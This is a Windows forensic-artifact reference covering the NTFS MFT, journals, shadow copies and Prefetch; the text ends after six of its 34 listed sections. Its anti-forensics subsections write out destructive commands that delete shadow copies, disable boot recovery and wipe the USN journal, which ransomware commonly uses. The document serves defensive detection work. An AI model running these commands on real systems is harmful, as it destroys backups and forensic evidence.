# Windows Forensic Artifacts — Encyclopedia

> Reference document. Domain knowledge only. No architectural prescriptions.
> Each section describes what the artifact IS, what it RECORDS, its FORMAT,
> retention behavior, parsers (by name), the canonical forensic insight it
> provides, known gotchas, anti-forensics interactions, and which other
> artifacts it cross-corroborates with.
>
> This is the document an analyst opens to look up an artifact mid-case.
> Order follows the SANS "Hunt Evil" / FOR500 / FOR508 conceptual progression
> from filesystem -> registry -> event logs -> derived caches -> auxiliary.

---

## Table of Contents

1.  $MFT — NTFS Master File Table
2.  $LogFile — NTFS Transaction Journal
3.  $UsnJrnl:$J — USN Change Journal
4.  $Boot, $Volume, $Bitmap — NTFS Metadata Files
5.  Volume Shadow Copies (VSS)
6.  Prefetch (.pf files)
7.  ShimCache / AppCompatCache
8.  Amcache.hve
9.  BAM / DAM — Background / Desktop Activity Moderator
10. SRUM — System Resource Usage Monitor
11. Registry Hives — SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT, UsrClass.dat
12. Run / RunOnce Keys (autoruns taxonomy)
13. Services (HKLM\SYSTEM\CurrentControlSet\Services)
14. Scheduled Tasks (C:\Windows\System32\Tasks)
15. WMI Persistence (root\subscription, OBJECTS.DATA)
16. Sysmon (Microsoft-Windows-Sysmon/Operational)
17. Security Event Log
18. System Event Log
19. PowerShell Logs (4103, 4104, 600, 800)
20. RDP-related Logs (1149, 21/23/24/25)
21. Defender Logs (1116/1117/5001/5007)
22. PowerShell ConsoleHost_history.txt
23. ShellBags
24. LNK Files + Jump Lists
25. Recycle Bin ($I/$R)
26. Browser Artifacts (Chrome, Edge, Firefox)
27. MUICache + UserAssist
28. MountedDevices + USBSTOR + USB Device Chain
29. Pagefile.sys / hiberfil.sys / swapfile.sys
30. ESE Databases (WebCacheV01.dat, SRUDB.dat, ntds.dit, Windows.edb)
31. Alternate Data Streams + Zone.Identifier
32. Notification Database (wpndatabase.db)
33. Activities Cache (ActivitiesCache.db)
34. Cross-Artifact Patterns


---

## 1. $MFT — NTFS Master File Table

**Full name:** Master File Table. Internally a system file named `$MFT` (FILE record 0 of itself). The MFT is to NTFS what the inode table is to ext4 — it is the index of every file and directory on the volume.

**Path / location:**
- On-disk: contiguous run starting at LCN given by `$Boot`'s `MftStartLcn` field. Always present; cannot be relocated to another volume.
- File system path (when mounted forensically): root of the volume, named literally `$MFT`. Normally hidden from Win32 API. Accessible via raw device read (`\\.\C:`), through FTK Imager, X-Ways, The Sleuth Kit's `icat`, or by copy via `fls`/`icat`/`fsutil` from a forensic copy.
- Sometimes present in a forensic acquisition as `\$Extend\$MFT` is NOT correct — `$MFT` lives in the root directory ($I30 of FILE record 5). `$Extend\` holds OTHER metadata files like `$UsnJrnl`.

**What it records:**

Every file, every directory, every NTFS metadata stream gets at least one MFT entry (FILE record). Each record is fixed-size — 1024 bytes by default (configurable via `BytesPerFileRecordSegment` in `$Boot`, but defaults are universal in practice). The record contains a header, plus a list of typed attributes:

- `$STANDARD_INFORMATION` (SI, attribute 0x10): four MACB timestamps + DOS file attributes (read-only, hidden, system, archive, etc.) + USN. **Writable by user-mode code** with appropriate privileges — this is what "timestomp" rewrites.
- `$FILE_NAME` (FN, attribute 0x30): the filename plus a second set of four MACB timestamps. Typically only written by the kernel on filesystem operations (create, rename, hardlink). User-mode tools cannot easily modify FN timestamps without going through documented filesystem operations.
- `$DATA` (attribute 0x80): the file contents. The default unnamed stream `$DATA` is the file body; named `$DATA` streams are alternate data streams (ADS).
- `$INDEX_ROOT` / `$INDEX_ALLOCATION` (attribute 0x90 / 0xA0): directory listings (B+ tree of child filenames).
- `$ATTRIBUTE_LIST` (attribute 0x20): present only when one MFT record isn't enough; points to additional FILE records describing further attributes.
- `$BITMAP`, `$SECURITY_DESCRIPTOR`, `$REPARSE_POINT`, `$EA`, `$EA_INFORMATION`, `$LOGGED_UTILITY_STREAM` (EFS), `$VOLUME_NAME`, `$VOLUME_INFORMATION`, `$OBJECT_ID` — situational.

Each file therefore has eight commonly examined timestamps: SI-Created, SI-Modified, SI-MFT-Modified ("Entry Modified" / "C-time"), SI-Accessed; and the same four under FN.

**Anchor file IDs (reserved):**
- 0 — $MFT
- 1 — $MFTMirr (backup of first 4 records, at midpoint of volume historically; modern Windows places it elsewhere)
- 2 — $LogFile
- 3 — $Volume
- 4 — $AttrDef
- 5 — `.` (root directory)
- 6 — $Bitmap (cluster allocation bitmap)
- 7 — $Boot
- 8 — $BadClus
- 9 — $Secure (Windows 2000+; SDS/SDH/SII security descriptors)
- 10 — $UpCase
- 11 — $Extend (directory containing $UsnJrnl, $Quota, $ObjId, $Reparse, $RmMetadata)
- 12–15 — reserved
- 16+ — user files

**Resident vs. non-resident attributes:**

Small attributes (and small files) live entirely inside the 1024-byte FILE record — "resident". When the data exceeds what fits, NTFS converts the attribute to "non-resident" and stores it as a data run (list of `<starting LCN, cluster count>` pairs). The practical cutoff is roughly ~700 bytes for $DATA after other attributes have taken their share. **Files under that threshold leave no slack on disk after deletion — recovery depends entirely on the FILE record persisting.** This is why "small text file" carving is so often "MFT record carving."

**Retention / deletion behavior:**

A FILE record is marked free by clearing the in-use flag (0x01) in the record header. The MFT itself does not shrink. The record sits there with its attributes intact — including filename, timestamps, and resident data — until that record slot is reused by a new file. On a busy system that may be minutes; on an idle one, years. This is why deleted file recovery from the MFT is so productive on lightly-used systems and disappointing on file servers.

**Format / encoding:**

Binary. Each FILE record begins with the ASCII magic `FILE` (older / corrupted records may show `BAAD`). The header includes the update sequence number (USN — not the same as USN Journal USN), fixup array (NTFS writes a 2-byte "fixup" at the end of each 512-byte sector and stores the real values in the header; readers must re-apply them or accept corrupted records), record number, hard link count, attribute offset, flags (0x01 = in use, 0x02 = directory). Attributes follow as TLV blocks.

**Parsers (by name only):**
- The Sleuth Kit: `fls`, `icat`, `istat`, `mmls`, `fsstat`
- Eric Zimmerman's `MFTECmd` (Windows; produces CSV/JSON)
- analyzeMFT (Python)
- `mft2csv` / `MFTExplorer` (Eric Zimmerman)
- `ntfsutils`, `RustyBlue`, `mft` (Rust crate by Omer Ben-Amram)
- log2timeline / plaso (`mft` parser plugin)
- X-Ways, EnCase, FTK, Autopsy (commercial / GUI)

**Canonical forensic insight:**

The MFT is the ground truth of "what files exist / existed" on the volume. It is the primary source for:
- Building a filesystem timeline (every file's create/modify/access/MFT-modify across both SI and FN).
- Detecting timestomping (SI < FN, or SI rounded to whole seconds while FN has sub-second precision).
- Recovering deleted files (FILE record intact, data runs valid, target clusters not yet overwritten).
- Identifying resident files that were "deleted" but still contain their full content in the FILE record.
- Reconstructing directory hierarchy independent of $I30 corruption (each FN attribute carries the parent reference).

**Known gotchas / analytical traps:**

- **SI vs FN precision.** Both store FILETIME (100ns ticks since 1601-01-01 UTC). FN is typically written by the kernel and reflects "what NTFS did"; SI is exposed to user-mode and reflects "what the application said." If SI is whole seconds and FN is sub-second, suspicion of timestomping (`SetFileTime`-based tools often pass `time_t`-derived FILETIMEs that lack sub-second precision; `timestomp.exe` from MAFIA only rewrote SI). If FN > SI for created/modified, suspicion is high. **However**, file system operations (e.g., a `MoveFileEx` across directories) can legitimately update FN to "now" while SI is preserved from the source — so FN > SI is not, by itself, proof.
- **Update Sequence Number (USN) in FILE record header** is NOT the USN Journal record number. Both are called USN in Microsoft's docs.
- **$DATA can have multiple named streams.** A file `evil.txt` may legitimately have `evil.txt:hidden`. Tools that walk only the default stream miss them.
- **Hard links** — a single FILE record may have multiple `$FILE_NAME` attributes, one per parent directory. Forensic timelines that key by `<MFT#, filename>` can produce duplicates.
- **The MFT grows but does not shrink.** A snapshot from yesterday's image will have the same record at index N referring to a different file than today's image. Cross-image comparisons must key by file ID + sequence number, not record number alone.
- **`$MFTMirr` covers only the first 4 records.** Don't assume it's a "full backup."
- **Sequence number** — each FILE record has a sequence number incremented on each reuse. File references in directory entries are 64-bit values: low 48 = MFT record, high 16 = sequence number. A directory entry whose sequence does not match the current record sequence is a stale reference (the file was deleted and the record reused).
- **$ATTRIBUTE_LIST** appears when one record overflows. Tools that ignore it miss attributes located in child records.
- **Sparse and compressed files** have their `$DATA` runs encoded differently; cluster-count math is not straightforward.
- **MFT on a forensic acquisition vs. a live system**: on a live system, the MFT is constantly mutating. Tools that read `\\.\C:\$MFT` while Windows is running may see partial writes.

**Anti-forensics interactions:**

- **Timestomp** (rewriting SI) — Mimikatz, Metasploit's `timestomp`, SetMACE, SetFileTime API. Visible by SI-FN divergence and by SI sub-second precision being zero.
- **MFT record manipulation** — rare in the wild; would require kernel-mode or raw disk write. Possible signature: invalid USN fixups, FILE magic intact but attribute offsets pointing nowhere.
- **File deletion + cluster overwrite** (`cipher /w`, `sdelete`, ATA Secure Erase): the FILE record may still exist marked free; the data clusters are zeroed. Recovery yields metadata but no contents.
- **Wiping the MFT itself**: large-scale destruction; produces a recognizable cliff in the timeline. Some ransomware overwrites $MFT pages.

**Cross-corroboration partners:**

- **$LogFile + $UsnJrnl** confirm what changed and when, independent of SI.
- **VSS shadows** provide prior-state MFTs for diff.
- **Prefetch** anchors that a binary actually ran (process creation) at a specific moment, which the MFT records as a file access on the .pf file.
- **Amcache** records the binary's SHA1 — confirming it existed and what it was even if the MFT record has been overwritten.
- **Event Log 4663** (object access) can corroborate the SI-Accessed timestamp.

---

## 2. $LogFile — NTFS Transaction Journal

**Full name:** NTFS Log File. FILE record 2 of the MFT. Sometimes referred to as the "NTFS journal" — though that term ambiguously also covers `$UsnJrnl`.

**Path / location:**
- File system path: `\$LogFile` at the volume root (hidden system file).
- Inside the MFT: FILE record 2.
- Size: defaults to ~64 MB on modern volumes, configurable via `chkdsk /L`. Treat as a fixed-size ring buffer.

**What it records:**

Every NTFS metadata change is logged here BEFORE it is committed to the live MFT or directory indexes — write-ahead logging in the database sense. Each change is one or more "log records." A log record describes a low-level operation in NTFS's internal vocabulary: "set bits in volume bitmap," "create attribute," "set value length," "add index entry," "delete attribute," "InitializeFileRecordSegment," "DeallocateFileRecordSegment," etc. There are roughly 30 NTFS opcodes — paired as `redo`/`undo` to support both crash recovery and rollback.

Per log record you typically see: LSN (log sequence number), the opcode, the target MFT record / attribute / VCN, before/after bytes, transaction ID, client ID. The records do NOT carry filenames or timestamps explicitly — those have to be reconstructed by replaying the operations.

**Retention behavior:**

Circular buffer of fixed size. Default 64 MB rolls in seconds-to-minutes on a busy system, minutes-to-hours on an idle one. **There is no retention guarantee.** On a quiet workstation a $LogFile snapshot may go back an hour or two; on a SQL Server it may not go back 30 seconds. Persistence across reboots: yes, the file persists, but Windows checkpoints and may truncate / restart the journal on clean shutdown.

**Format / encoding:**

Binary, page-based. Each page is 4096 bytes (typically), with a page header that includes an "RSTR" or "RCRD" magic. RSTR pages are the restart area (NTFS uses two restart areas, alternated for atomic update). RCRD pages contain log records. As with MFT FILE records, each page has USN fixup bytes at sector boundaries.

Records inside a page use a structure documented in Brian Carrier's "File System Forensic Analysis" and reverse-engineered further by Joachim Metz (`libfsntfs`) and Pavel Kindlmann ($LogFile reverse-engineering papers, presented at SANS DFIR Summit). Microsoft does not publish a public format spec for the record contents.

**Parsers (by name only):**
- `LogFileParser` (David Cowen / G-C Partners — open-source Python)
- `NTFS_LOG_TRACKER` (Blackbag, now owned by Cellebrite)
- `libfsntfs` (Joachim Metz; `fsntfsinfo`)
- log2timeline / plaso plugin (limited coverage)
- ANJP — "Advanced NTFS Journal Parser" (commercial, TZWorks)
- X-Ways' "$LogFile entries" view

**Canonical forensic insight:**

The $LogFile is the artifact for **short-lived files** — files that existed briefly and were deleted. Because the journal logs file creation, attribute writes, and deletion as separate, ordered operations, an analyst can reconstruct a file that was created, written to, executed (maybe), and deleted entirely within the journal's retention window — even if the MFT record has already been reused. This is essential for live-off-the-land scripts dropped from PowerShell, staged ransomware notes, and `at`-scheduled binaries.

Secondary use: **crash recovery analysis** (was the journal in mid-transaction at the time of the image?) and **chkdsk artifact detection** (chkdsk leaves recognizable patterns in the journal).

**Known gotchas:**

- **Roll-over is silent and fast.** If you image hours after the incident, the $LogFile may have nothing of interest.
- **Reconstructing filenames is non-trivial.** Filenames appear in $FILE_NAME attribute creations, not as standalone fields — parsers must stitch them to MFT records.
- **No timestamps in log records themselves.** Time has to be inferred from the position in the journal relative to checkpoints. Order is reliable; absolute time is not.
- **Encrypted volumes** (BitLocker) — the $LogFile is encrypted at rest; you need the recovery key or unlocked image.
- **Parsers disagree.** Different tools produce different record counts and decoded contents — vendor-specific normalization is real.

**Anti-forensics interactions:**

- **Resizing the journal** via `chkdsk /L:8` (truncate to 8 MB) destroys older entries. Possible if attacker has admin.
- **Mass file operations as cover** — creating thousands of dummy files rolls the journal in seconds.
- **Manual page wiping** is rare; would need raw disk write.

**Cross-corroboration partners:**

- **$UsnJrnl:$J** — different journal, different granularity. UsnJrnl records per-file change summaries with filenames AND timestamps; $LogFile records lower-level transactional ops without timestamps. They overlap but neither subsumes the other.
- **$MFT** — to resolve which FILE record an opcode references.
- **VSS** — older $LogFile snapshots may be in older shadow copies.

---

## 3. $UsnJrnl:$J — USN Change Journal

**Full name:** Update Sequence Number Journal. The `$J` is the named alternate data stream on the file `$UsnJrnl`. There is also `$Max` (control / configuration metadata).

**Path / location:**
- File system path: `\$Extend\$UsnJrnl` (the file) with `:$J` (sparse data stream containing records) and `:$Max` (metadata).
- Inside the MFT: FILE record varies (assigned at journal creation; look it up via `$Extend` directory listing).
- Activation: present by default on modern Windows volumes; can be enabled/disabled via `fsutil usn`.

**What it records:**

A high-level change log: for each filesystem mutation (create, delete, rename, data overwrite, attribute change, ACL change, etc.), one USN record is appended to `$J`. Each record has:

- USN (monotonically increasing 64-bit counter; also written into the SI of the affected file)
- Timestamp (FILETIME — actual wall time)
- File reference number (MFT record + sequence) of the affected file
- Parent file reference number
- Reason flags (bitmask — see below)
- Source info (NTFS, replication, replication+, etc.)
- Security ID (legacy)
- File attributes
- Filename (variable length; the actual name at time of operation)

**Reason flags (the lingua franca of UsnJrnl analysis):**

| Hex        | Symbolic                       | Meaning                                                |
|------------|--------------------------------|--------------------------------------------------------|
| 0x00000001 | DATA_OVERWRITE                 | Default data stream overwrite                          |
| 0x00000002 | DATA_EXTEND                    | Default data stream extended                           |
| 0x00000004 | DATA_TRUNCATION                | Default data stream shrunk                             |
| 0x00000010 | NAMED_DATA_OVERWRITE           | Named ADS overwrite                                    |
| 0x00000020 | NAMED_DATA_EXTEND              | Named ADS extended                                     |
| 0x00000040 | NAMED_DATA_TRUNCATION          | Named ADS shrunk                                       |
| 0x00000100 | FILE_CREATE                    | New file/dir created                                   |
| 0x00000200 | FILE_DELETE                    | File/dir deleted                                       |
| 0x00000400 | EA_CHANGE                      | Extended attributes changed                            |
| 0x00000800 | SECURITY_CHANGE                | ACL / owner changed                                    |
| 0x00001000 | RENAME_OLD_NAME                | Source side of a rename                                |
| 0x00002000 | RENAME_NEW_NAME                | Destination side of a rename                           |
| 0x00004000 | INDEXABLE_CHANGE               | Indexing service relevance changed                     |
| 0x00008000 | BASIC_INFO_CHANGE              | SI attribute (timestamps, attributes) changed          |
| 0x00010000 | HARD_LINK_CHANGE               | Hard link added/removed                                |
| 0x00020000 | COMPRESSION_CHANGE             | Compression state changed                              |
| 0x00040000 | ENCRYPTION_CHANGE              | EFS encryption changed                                 |
| 0x00080000 | OBJECT_ID_CHANGE               | Object ID changed                                      |
| 0x00100000 | REPARSE_POINT_CHANGE           | Reparse point added/removed                            |
| 0x00200000 | STREAM_CHANGE                  | ADS created/deleted                                    |
| 0x00400000 | TRANSACTED_CHANGE              | Part of a TxF transaction                              |
| 0x00800000 | INTEGRITY_CHANGE               | Integrity stream changed (ReFS-ish)                    |
| 0x80000000 | CLOSE                          | Final record for this handle; coalesced flags          |

Reason flags accumulate per-handle until the file handle closes; the last record (CLOSE bit set) carries the union of all reasons observed during the handle's lifetime.

**Retention behavior:**

Sparse file, default max size 32 MB (Windows 10/11 increased default to 32 MB; older Windows: ~32 MB). When it fills, old data is sparsified (the on-disk extents are reclaimed) but the **logical sparse file keeps growing** — so a 200 MB sparse `$J` may have only the last 32 MB of actual records. Reading the file with a parser that respects sparse extents shows the live records; treating it as a flat byte stream gives megabytes of zeros and one cluster of records.

Persistence: across reboots — yes. Across volume reformat — no. Across `fsutil usn deletejournal /D C:` — destroyed; that command requires admin and produces an event (security log 4663 with the journal as target if SACL set; otherwise no direct log).

Retention window in practice: hours on workstations, minutes on file servers, many hours on idle endpoints. Significantly shorter than ShimCache's 1024-entry coverage.

**Format / encoding:**

Binary, variable-length records, each prefixed with a 4-byte length. Format documented by Microsoft as `USN_RECORD_V2` (most common) and `USN_RECORD_V3` (longer file IDs for ReFS). The sparse nature is critical — naive tools that read every byte sequentially produce huge runs of zeros.

**Parsers (by name only):**
- `MFTECmd` (Eric Zimmerman) — parses `$J` when given the path
- `UsnJrnl2Csv` (Jschicht)
- `usn` (Python, by PoorBillionaire)
- log2timeline / plaso `usnjrnl` parser
- `fsutil usn readjournal` (live system only)
- X-Ways, EnCase
- `analyzeMFT`'s sibling tools (some include UsnJrnl)

**Canonical forensic insight:**

This is THE artifact for **short-lived file detection** and **deletion timeline**. UsnJrnl records survive after the MFT FILE record has been reused — meaning a file that was created, written, executed, and deleted in 30 seconds can be entirely invisible in the MFT yet fully visible in `$J`. With reason flags + filenames + timestamps + parent references, you can reconstruct the lifecycle of a dropper, a staged credential dump, a ransomware key file.

**Known gotchas:**

- **Sparse file handling.** Parsers must read sparse extents correctly. Carved-from-image without sparse support yields garbage. Tools that copy `$J` to a flat file with `dd` produce huge zero-padded output.
- **The 32 MB rollover is silent.** Same as $LogFile — old records disappear without notice.
- **Reason flags are cumulative on coalesced records.** A single record with `FILE_CREATE | DATA_EXTEND | CLOSE` means all three happened during the handle, not that they happened in that record's timestamp instant.
- **Parent reference + filename** is the link to the MFT. If the parent record has since been reused, the path you reconstruct may be wrong.
- **USN_RECORD_V2 vs V3.** ReFS and very recent NTFS use V3 (128-bit file IDs). Older parsers fail silently on V3.
- **Filename "DECOY"** — Windows uses internal names for some operations (e.g., `Desktop.ini` is touched on every directory enumeration). Filter accordingly.
- **System idle period.** A workstation that idled for 6 hours before imaging may have a `$J` covering the idle period only.
- **CLOSE-only records.** When you only see a single record with `CLOSE` and a union of reasons, the file's individual modification points are lost — only the aggregate is preserved.

**Anti-forensics interactions:**

- **`fsutil usn deletejournal /D <vol>`** — wipes journal entirely. Requires admin. Telltales: journal `$Max` shows a fresh creation USN.
- **Disabling the journal** (`fsutil usn deletejournal /N /D`) — no recreation; future analysis blind.
- **Filling the journal** via mass create/delete (`for i in 1..1000000: touch & rm`) — pushes prior records out the back. Visible as a cliff of CREATE/DELETE events.
- **Volume reformat** — destroys $J. Visible by $Boot serial changing.

**Cross-corroboration partners:**

- **$MFT** — same file, deeper detail. UsnJrnl says "file X was created"; MFT shows its attributes if record still alive.
- **$LogFile** — lower-level, no filenames, no timestamps, but may extend the window slightly.
- **Prefetch** — corroborates execution. UsnJrnl shows the .exe being created; Prefetch shows it ran.
- **Sysmon 11 (FileCreate)** — same event, different vantage. If both agree, you have ironclad evidence. If only UsnJrnl shows it, Sysmon wasn't logging that path. If only Sysmon shows it, you may have caught a deletion that rolled the journal.
- **VSS** — older `$UsnJrnl:$J` from prior shadows extends the window.

---


## 4. $Boot, $Volume, $Bitmap — NTFS Metadata Files (Brief)

**$Boot** (FILE record 7, file `\$Boot`):
- First sector + extended boot record. Contains the BIOS Parameter Block (BPB) with cluster size, MFT start LCN, MFT mirror start LCN, $MFT record size, $INDX record size, volume serial number (8 bytes), and 16 bytes of boot code reference.
- Forensic value: **volume serial number** is a stable identifier of the volume; appears in LNK files, Prefetch, Jump Lists, ShellBags as a cross-reference. A reformatted volume has a different serial — useful to detect reinstalls between artifacts that reference the old serial and a fresh `$Boot`.
- Gotcha: BootSector backup lives at the LAST sector of the volume; a corrupted primary may still be readable from the backup.
- Anti-forensics: rewriting the BPB to corrupt cluster size renders the volume unmountable but the disk is otherwise intact — sometimes done by destructive malware as a quick-kill.

**$Volume** (FILE record 3, file `\$Volume`):
- Holds `$VOLUME_INFORMATION` (NTFS version major/minor — 3.1 on modern Windows) and `$VOLUME_NAME` (the user-visible volume label).
- Dirty bit lives here. `fsutil dirty query C:` reports it; chkdsk consults it on boot. A volume that was forcibly powered off shows dirty; a clean shutdown clears it.
- Forensic value: confirms NTFS version, label history (only the current label is here — historical labels recoverable from registry MountedDevices / USBSTOR).

**$Bitmap** (FILE record 6, file `\$Bitmap`):
- One bit per cluster on the volume: 1 = allocated, 0 = free.
- Forensic value: defines "unallocated space" for carving. Tools like `blkls` (TSK) consult `$Bitmap` to dump only unallocated clusters.
- Gotcha: a "free" cluster may still contain old file data — `$Bitmap` lying about allocation is unusual but possible during chkdsk recovery.

These three files are rarely the protagonist of a finding, but their metadata is consumed by every downstream tool.

---

## 5. Volume Shadow Copies (VSS)

**Full name:** Volume Shadow Copy Service. Also: Shadow Copies, VSS Snapshots, Restore Points (the System Restore feature uses VSS but is not identical).

**Path / location:**
- Storage: hidden System Volume Information directory at the root of each volume: `C:\System Volume Information\{GUID}{...}`. Files are named `{3808876b-c176-4e48-b7ae-04046e6cc752}` plus a sequence and have no extension. These are the "shadow storage" — copy-on-write differential data.
- Accessed via the VSS API at `\\.\HarddiskVolumeShadowCopyN` where N = shadow index (1, 2, 3...).
- Configuration: `HKLM\SYSTEM\CurrentControlSet\Services\VSS` and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SPP\Clients`.
- Listed via `vssadmin list shadows` on live system.

**What it records:**

A point-in-time snapshot of an entire NTFS volume. At creation, VSS captures the volume's metadata (the MFT, registry hives, all files) as a copy-on-write differential. Subsequent writes to the volume cause the original blocks to be copied into shadow storage before being overwritten on the live volume. The shadow therefore preserves the state of every file as it existed at the snapshot moment.

Snapshots are created automatically by:
- System Restore (typically weekly, plus before significant changes — driver install, Windows Update).
- Backup software (Windows Backup, System State Backup, third-party).
- Volume operations that need a consistent view (Windows Search indexing, sometimes).
- Manual creation via `vssadmin create shadow` (Server only — Windows client desktops cannot create shadows from `vssadmin` since Vista; `wmic shadowcopy call create` works on clients).

**Retention behavior:**

- Default storage: up to 10% of volume capacity (configurable via `vssadmin resize shadowstorage`).
- When storage fills, oldest shadows are deleted FIFO.
- Number of shadows commonly observed: 1–64 on client systems with default System Restore; servers may have many more.
- Persistence across reboot: yes.
- Persistence across Windows Upgrade: typically destroyed.
- Persistence across volume reformat: destroyed.

**Format / encoding:**

VSS storage files use Microsoft's proprietary differential format. The first 1.5 KB of each shadow store file has a `GUID_SHADOW_COPY` magic. Block-mapping data describes which volume blocks were overwritten and where the originals are kept.

**Parsers (by name only):**
- `vshadowmount` / `vshadowinfo` (libvshadow, Joachim Metz) — mounts shadows as block devices on Linux
- `vss_carver` (Mari DeGrazia / G-C Partners)
- `Reflect` (Macrium — not forensic but reads VSS)
- Direct mount on Windows: `mklink /D` to `\\.\HarddiskVolumeShadowCopyN\`
- `vshadow.exe` (Windows SDK)
- The Sleuth Kit (no native VSS — must mount shadow first)
- Volatility — no direct support; need to extract memory from a system at the right point
- Plaso `vss` source type (uses libvshadow under the hood)

**Canonical forensic insight:**

VSS is **the lever for "look at older state."** When the live MFT, registry, or browser DB has been tampered with or rolled, an earlier shadow may have the unmolested version. Investigation patterns:

- Compare current SOFTWARE registry against shadow's SOFTWARE — find what was added since.
- Diff current MFT against shadow MFT — find what files appeared and disappeared.
- Recover the unencrypted browser History before ransomware encrypted it.
- Pull earlier event log files that have since been rolled or cleared.
- Extract earlier $UsnJrnl:$J for a longer change window.

**Known gotchas:**

- **Not always present.** Servers often have shadows disabled. Some corporate fleets disable System Restore.
- **Shadows can be enumerated but not always mounted from a forensic image** — depends on imaging tool's NTFS layer.
- **A shadow is volume-wide.** You don't get "shadow of NTUSER.DAT" — you get a frozen view of the whole C: drive at time T. Tools that present individual file restores are abstracting this.
- **`vssadmin list shadows` runs on the live host.** On a forensic image you must mount and enumerate via libvshadow or similar.
- **Symbolic links inside shadows** point to live volume paths and may resolve to current files, not shadow contents — be careful with relative paths.
- **Shadows of system files are not always complete.** SSD TRIM has been known to nullify shadow blocks even though VSS believes them retained — a "phantom" shadow that lists but cannot read.
- **Shadow age vs. shadow ID.** Shadow ID is a GUID, not chronological. Creation time is the field to sort on.
- **The 10% storage limit can be reached silently.** A workstation with heavy writes may keep only hours of shadows, despite the OS being installed years ago.

**Anti-forensics interactions:**

- **`vssadmin delete shadows /all /quiet`** — the canonical ransomware anti-recovery command. Visible in PowerShell history, in cmd line audit logs (4688 with parent of explorer.exe / cmd.exe), in `wmic.exe shadowcopy delete` traces, and in Sysmon Event 1 if enabled. Almost all major ransomware families do this within the first few minutes of execution.
- **`wmic.exe shadowcopy delete /nointeractive`** — equivalent.
- **`bcdedit /set {default} recoveryenabled No`** + **`bcdedit /set {default} bootstatuspolicy ignoreallfailures`** — often accompany VSS deletion; the combination is a strong ransomware indicator.
- **Resizing storage to ~0** — `vssadmin resize shadowstorage /on=C: /for=C: /maxsize=320MB` (smallest allowed). Forces shadow eviction.
- **Disabling VSS service** — `Set-Service VSS -StartupType Disabled` + `Stop-Service VSS`. Prevents new shadows; existing shadows survive until deleted.
- **Telltales after deletion:** the System Volume Information directory may retain orphaned storage files; the `vssadmin list shadows` enumeration is empty; the registry's SPP client list shows "last create" timestamps stale; event logs `System` channel `VSS` event ID 8224 ("The VSS service is shutting down due to idle timeout") or 12289 ("Volume Shadow Copy Service error").

**Cross-corroboration partners:**

- **Event Log Microsoft-Windows-VolumeSnapshot-Driver/Operational** logs creation/deletion.
- **Event Log System / Volume Shadow Copy Service** source — events 8193, 8194, 8224, 12289.
- **PowerShell history** + **`ConsoleHost_history.txt`** — `vssadmin delete shadows` line frequently observed verbatim.
- **Sysmon 1 (process create)** — VSS deletion commands.
- **Prefetch** — `VSSADMIN.EXE-XXXXXXXX.pf` proves it ran. (Note: Prefetch is itself volume-bound and may not exist if system disk is SSD without prefetch enabled — common on modern Windows where SuperFetch behaves differently.)

---

## 6. Prefetch (.pf files)

**Full name:** Prefetcher cache. Sometimes called "trace files." Part of the Cache Manager subsystem of Windows.

**Path / location:**
- `C:\Windows\Prefetch\<EXENAME>-<HASH>.pf`
- Configuration: `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters\EnablePrefetcher` (DWORD: 0=disabled, 1=app launch only, 2=boot only, 3=both — default 3 on workstations, often 0 on servers).
- Prefetcher disabled by default on Windows Server unless someone enables it. **CRITICAL gotcha** — many enterprise endpoints have no prefetch.
- On SSD systems, prefetch is enabled but ReadyBoot/SuperFetch behavior differs; .pf files still get written.

**What it records:**

For each executable that runs from disk, the prefetcher tracks what files and DLLs it loaded in the first ~10 seconds of execution. The .pf file caches this list so Windows can preload pages on next launch, speeding boot.

Per .pf entry:
- Executable name (in the filename — uppercased, truncated to 29 chars)
- Hash (8 hex chars in the filename — derived from path + command-line; same .exe in two different paths gives two .pf files)
- Run count (how many times this binary has launched)
- Last run time (up to 8 in Win10/11; only the most recent in Win7/8)
- Files & directories loaded in the first 10 seconds — including DLLs, INIs, config files, sometimes scripts the exe consumed
- Volume info (serial number, creation date, device path) for each volume referenced

**Retention behavior:**

- Up to 1024 .pf files retained (historical limit; Win10+ raised practical cap, but 1024 still cited).
- LRU eviction when full.
- An executable that hasn't run in a long time is purged.
- Persistence across reboots: yes.
- Persistence across Windows Upgrade: typically destroyed (Prefetch directory is reset).
- Reset by: `del C:\Windows\Prefetch\*.pf` (admin), disabling prefetcher service, registry-disabling prefetcher.

**Format / encoding:**

Binary. Versioned:
- Version 17 — Windows XP/2003
- Version 23 — Vista/7
- Version 26 — Windows 8/8.1
- Version 30 — Windows 10 (compressed: starts with `MAM\x04` MS-Compression header — must be decompressed first)
- Version 30/31 — Windows 11

The Windows 10/11 format is MAM/XPRESS-Huffman compressed; tools must decompress before parsing.

**Parsers (by name only):**
- `PECmd` (Eric Zimmerman)
- `prefetch-parser` (PoorBillionaire)
- `Windows-Prefetch-Parser`/`prefetchruntimes` (various Python projects)
- `pf` (TZWorks)
- `WinPrefetchView` (Nirsoft) — GUI
- log2timeline/plaso `prefetch` parser
- Volatility 3 `windows.prefetch` (memory-resident structures)
- libscca (Joachim Metz) — the canonical library underlying many parsers

**Canonical forensic insight:**

Prefetch is **the artifact for "did this binary run on this host?"** It is durable, hard to suppress without admin, and includes per-execution timestamps for the last 8 runs (Win10+) and the file list loaded.

Specific patterns:
- Anomalous binary (e.g., `MIMIKATZ.EXE-XXXXXXXX.pf`) — instant confirmation it executed.
- Binary path from the filename hash — even if the binary itself has been deleted, the .pf survives and points back at the path.
- DLL list — confirms which DLLs the binary loaded; useful for proxy-execution detection (rundll32 loading an unusual DLL).
- Volume serial — links execution to a specific external/removable drive.
- Run count — if a binary appears to have run 47 times, the operator has been on the system a while.

**Known gotchas:**

- **Hash naming convention** is based on a hashing function over the executable's full path (and, in some Windows versions, the command line). Same name in two different paths -> two .pf files. Renaming `notepad.exe -> evil.exe` produces a `EVIL.EXE-<hash>.pf` distinct from `NOTEPAD.EXE-<hash>.pf`. Path-dependent hashing means moving an exe to a new directory creates a new .pf.
- **The last 8 runs gotcha (Win10/11).** Older parsers only show the single most recent run. Modern .pf format records up to 8. If you read only "LastRunTime," you miss seven prior executions documented in the same file.
- **First 10 seconds rule.** Prefetch logs files accessed during the prefetcher's monitoring window — typically the first 10 seconds. Files opened by the process later don't appear.
- **Server: typically off.** Don't assume absence == didn't run. Check the registry value first.
- **`/PrivateChar` and Win10 prefetch hash function.** Crowdstrike published reversing of this in 2018; collisions are practically impossible.
- **Hash differs between Vista, Win7, Win10.** Cross-OS comparisons of hash values fail.
